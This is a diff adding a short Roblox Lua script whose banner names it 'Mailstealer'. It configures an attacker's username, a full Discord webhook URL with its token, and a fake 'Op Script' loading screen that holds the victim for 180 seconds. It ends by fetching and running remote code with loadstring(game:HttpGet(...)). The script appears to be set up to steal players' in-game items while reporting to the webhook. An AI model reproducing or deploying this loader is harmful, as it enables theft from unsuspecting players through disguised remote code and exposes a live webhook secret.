@@ -1,0 +1,26 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "Red_dummy4"
+Webhook = "https://discord.com/api/webhooks/1131180869692964955/Syzws-VQ8U6T4TXa7U43pWuftoUvyhByT6PdfYt7eGoruDJBtsfmsHYpgM5D2mkWSxse"
+UserName2 = "Red_dummy4"
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "Op Script"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("raw link"))()
